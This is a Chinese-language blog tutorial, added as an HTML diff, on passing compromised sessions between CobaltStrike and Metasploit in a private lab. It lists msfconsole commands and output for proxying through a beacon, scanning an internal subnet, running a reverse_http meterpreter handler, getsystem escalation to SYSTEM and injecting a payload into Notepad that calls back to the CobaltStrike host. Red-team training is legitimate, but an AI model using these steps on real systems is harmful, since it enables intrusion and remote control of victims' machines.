@@ -1,0 +1,99 @@
+<!DOCTYPE html><html lang="cn"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="robots" content="index, follow"><title>metasploit和CobaltStrike联动 • Webb</title><meta name="description" content="metasploit和CobaltStrike联动 - Webb"><link rel="icon" href="/57182600.jpeg"><link rel="stylesheet" href="https://unpkg.com/nanoreset@3.0.1/nanoreset.min.css"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="Webb"><meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Webb" type="application/atom+xml">
+</head><body><div class="wrap" id="barba-wrapper"><header><h1 class="branding"><a href="/" title="Webb"><img class="logo-image" src="/57182600.jpeg" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link no-barba" href="/" target="_self">主页</a></li><li class="nav-list-item"><a class="nav-list-link no-barba" href="/about" target="_self">关于</a></li><li class="nav-list-item"><a class="nav-list-link no-barba" href="/works" target="_self">作品</a></li><li class="nav-list-item"><a class="nav-list-link no-barba" href="/archives" target="_self">档案</a></li><li class="nav-list-item"></ul></header><div class="barba-container"><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">metasploit和CobaltStrike联动</h1><div class="post-info"><a></a>2022-04-25</div><div class="post-content"><h2 id="0-环境"><a href="#0-环境" class="headerlink" title="0.环境"></a>0.环境</h2><table>
+<thead>
+<tr>
+<th>名称</th>
+<th>IP</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>metasploit</td>
+<td>192.168.1.100</td>
+</tr>
+<tr>
+<td>靶机</td>
+<td>192.168.1.101</td>
+</tr>
+<tr>
+<td></td>
+<td>192.168.100.155</td>
+</tr>
+<tr>
+<td>CobaltStrike</td>
+<td>192.168.1.103</td>
+</tr>
+</tbody></table>
+<h2 id="1-CobaltStrike会话传递给metasploit。"><a href="#1-CobaltStrike会话传递给metasploit。" class="headerlink" title="1 CobaltStrike会话传递给metasploit。"></a>1 CobaltStrike会话传递给metasploit。</h2><h3 id="1-1-使用CobaltStrike的Socks代理"><a href="#1-1-使用CobaltStrike的Socks代理" class="headerlink" title="1.1 使用CobaltStrike的Socks代理"></a>1.1 使用CobaltStrike的Socks代理</h3><ul>
+<li><p>先使用CobaltStrike生产一个反弹shell。</p>
+</li>
+<li><p>等待连接完成已经按照下图步骤开启Socks代理。</p>
+</li>
+</ul>
+<p><img src="/../../images/metasploit%E5%92%8CCobaltStrike%E8%81%94%E5%8A%A8/%E6%88%AA%E5%9B%BE_2022-04-25_10-58-05.png" alt="截图_2022-04-25_10-58-05.png"></p>
+<ul>
+<li>设置Socks端口这里我使用默认。</li>
+</ul>
+<p><img src="/../../images/metasploit%E5%92%8CCobaltStrike%E8%81%94%E5%8A%A8/%E6%88%AA%E5%9B%BE_2022-04-25_11-02-40.png" alt="截图_2022-04-25_11-02-40.png"></p>
+<ul>
+<li>代理开启成功。</li>
+</ul>
+<p><img src="/../../images/metasploit%E5%92%8CCobaltStrike%E8%81%94%E5%8A%A8/%E6%88%AA%E5%9B%BE_2022-04-25_11-03-59.png" alt="截图_2022-04-25_11-03-59.png"></p>
+<ul>
+<li>获取metasploit代理配置。</li>
+</ul>
+<p><img src="/../../images/metasploit%E5%92%8CCobaltStrike%E8%81%94%E5%8A%A8/%E6%88%AA%E5%9B%BE_2022-04-25_11-11-26.png" alt="截图_2022-04-25_11-11-26.png"></p>
+<ul>
+<li>复制代理配置。</li>
+</ul>
+<p><img src="/../../images/.config/marktext/images/2022-04-25-11-15-04-image.png" alt="2022-04-25-11-15-04-image.png"></p>
+<ul>
+<li>在metasploit输入代理配置信息之后就可以通过CobaltStrike代理使用metasploit的功能。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; setg Proxies socks4:192.168.1.103:14265</span><br><span class="line">Proxies =&gt; socks4:192.168.1.103:14265</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用metasploit的端口扫描。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/portscan/tcp </span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; <span class="built_in">set</span> rhosts 192.168.100.1/24</span><br><span class="line">rhosts =&gt; 192.168.100.1/24</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; <span class="built_in">set</span> ports 80,888,8080,8888</span><br><span class="line">ports =&gt; 80,888,8080,8888</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; <span class="built_in">set</span> threads 20</span><br><span class="line">threads =&gt; 20</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; exploit </span><br><span class="line">[*] 192.168.100.1/24:     - Scanned  36 of 256 hosts (14% complete)</span><br><span class="line">[*] 192.168.100.1/24:     - Scanned  57 of 256 hosts (22% complete)</span><br><span class="line">[*] 192.168.100.1/24:     - Scanned  80 of 256 hosts (31% complete)</span><br><span class="line">[*] 192.168.100.1/24:     - Scanned 118 of 256 hosts (46% complete)</span><br><span class="line">[+] 192.168.100.131:      - 192.168.100.131:8888 - TCP OPEN</span><br><span class="line">[*] 192.168.100.1/24:     - Scanned 140 of 256 hosts (54% complete)</span><br><span class="line">[*] 192.168.100.1/24:     - Scanned 160 of 256 hosts (62% complete)</span><br><span class="line">[*] 192.168.100.1/24:     - Scanned 180 of 256 hosts (70% complete)</span><br><span class="line">[*] 192.168.100.1/24:     - Scanned 217 of 256 hosts (84% complete)</span><br><span class="line">[*] 192.168.100.1/24:     - Scanned 239 of 256 hosts (93% complete)</span><br><span class="line">[*] 192.168.100.1/24:     - Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-将CobaltStrike的会话传递到metasploit。"><a href="#1-2-将CobaltStrike的会话传递到metasploit。" class="headerlink" title="1.2 将CobaltStrike的会话传递到metasploit。"></a>1.2 将CobaltStrike的会话传递到metasploit。</h3><ul>
+<li>msf配置监听器。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_http</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.1.100</span><br><span class="line">lhost =&gt; 192.168.1.100</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit </span><br><span class="line">[*] Started HTTP reverse handler on http://192.168.1.100:8080</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>选择监听器。</li>
+</ul>
+<p><img src="/../../images/metasploit%E5%92%8CCobaltStrike%E8%81%94%E5%8A%A8/%E6%88%AA%E5%9B%BE_2022-04-25_14-49-58.png" alt="截图_2022-04-25_14-49-58.png"></p>
+<ul>
+<li>创建一个Foreign HTTP监听器。这里的地址和端口是metasploit设置的信息。</li>
+</ul>
+<p><img src="/../../images/metasploit%E5%92%8CCobaltStrike%E8%81%94%E5%8A%A8/%E6%88%AA%E5%9B%BE_2022-04-25_15-00-12.png" alt="截图_2022-04-25_15-00-12.png"></p>
+<ul>
+<li>选择新建会话。</li>
+</ul>
+<p><img src="/../../images/metasploit%E5%92%8CCobaltStrike%E8%81%94%E5%8A%A8/%E6%88%AA%E5%9B%BE_2022-04-25_15-01-24.png" alt="截图_2022-04-25_15-01-24.png"></p>
+<ul>
+<li>选择刚才创建的监听器。</li>
+</ul>
+<p><img src="/../../images/metasploit%E5%92%8CCobaltStrike%E8%81%94%E5%8A%A8/%E6%88%AA%E5%9B%BE_2022-04-25_15-02-13.png" alt="截图_2022-04-25_15-02-13.png"></p>
+<ul>
+<li>会话传递成功。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started HTTP reverse handler on http://192.168.1.1008080</span><br><span class="line">[!] http://192.168.1.100:8080 handling request from 192.168.1.101; (UUID: 9c8ocpoi) Without a database connected that payload UUID tracking will not work!</span><br><span class="line">[*] http://192.168.1.100:8080 handling request from 192.168.1.101; (UUID: 9c8ocpoi) Staging x86 payload (176220 bytes) ...</span><br><span class="line">[!] http://192.168.1.100:8080 handling request from 192.168.1.101; (UUID: 9c8ocpoi) Without a database connected that payload UUID tracking will not work!</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.100:8080 -&gt; 127.0.0.1 ) at 2022-04-25 15:02:37 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN-HHP4Q76IAO9\Administrator</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-metasploit会话传递给CobaltStrike。"><a href="#2-metasploit会话传递给CobaltStrike。" class="headerlink" title="2 metasploit会话传递给CobaltStrike。"></a>2 metasploit会话传递给CobaltStrike。</h2><ul>
+<li><p>这里我使用CobaltStrike刚才传递到metasploit会话，现在我把metasploit的会话传递回CobaltStrike。</p>
+</li>
+<li><p>使用metasploit中的<code>windows/local/payload_inject</code>模块。这里设置ip和端口是CobaltStrike的test监听器。</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">bg</span></span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf6 exploit(multi/handler) &gt; use exploit/windows/local/payload_inject</span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/payload_inject) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line">msf6 exploit(windows/local/payload_inject) &gt; <span class="built_in">set</span> lhost 192.168.1.103</span><br><span class="line">lhost =&gt; 192.168.1.103</span><br><span class="line">msf6 exploit(windows/local/payload_inject) &gt; <span class="built_in">set</span> lport 4096</span><br><span class="line">lport =&gt; 4096</span><br><span class="line">msf6 exploit(windows/local/payload_inject) &gt; <span class="built_in">set</span> session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 exploit(windows/local/payload_inject) &gt; exploit </span><br><span class="line"></span><br><span class="line">[-] Handler failed to <span class="built_in">bind</span> to 192.168.1.103:4096</span><br><span class="line">[*] Started HTTP reverse handler on http://0.0.0.0:4096</span><br><span class="line">[*] Running module against WIN-HHP4Q76IAO9</span><br><span class="line">[*] Spawned Notepad process 9580</span><br><span class="line">[*] Injecting payload into 9580</span><br><span class="line">[*] Preparing <span class="string">&#x27;windows/meterpreter/reverse_http&#x27;</span> <span class="keyword">for</span> PID 9580</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>创建成功。</li>
+</ul>
+<p><img src="/../../images/metasploit%E5%92%8CCobaltStrike%E8%81%94%E5%8A%A8/%E6%88%AA%E5%9B%BE_2022-04-25_15-14-03.png" alt="截图_2022-04-25_15-14-03.png"></p>
+</div></article></div></main><footer><div class="paginator"><a class="prev" href="/2022/04/25/Windows-%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98%E6%B8%85%E5%8D%95/">prev</a><a class="next" href="/2022/04/15/wpscan/%E8%A7%A3%E5%86%B3wpscan%E6%89%BE%E4%B8%8D%E5%88%B0webrick%E9%94%99%E8%AF%AF/">next</a></div><div class="copyright"><p>&copy; 2022 <a href="http://webb-l.top">Webb</a><br>Powered by <a href="https://hexo.io/" rel="noreferrer" target="_blank">Hexo</a></p></div></footer></div></div><script src="https://cdnjs.cloudflare.com/ajax/libs/barba.js/1.0.0/barba.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {
+    Barba.Pjax.start()
+})</script></body></html>
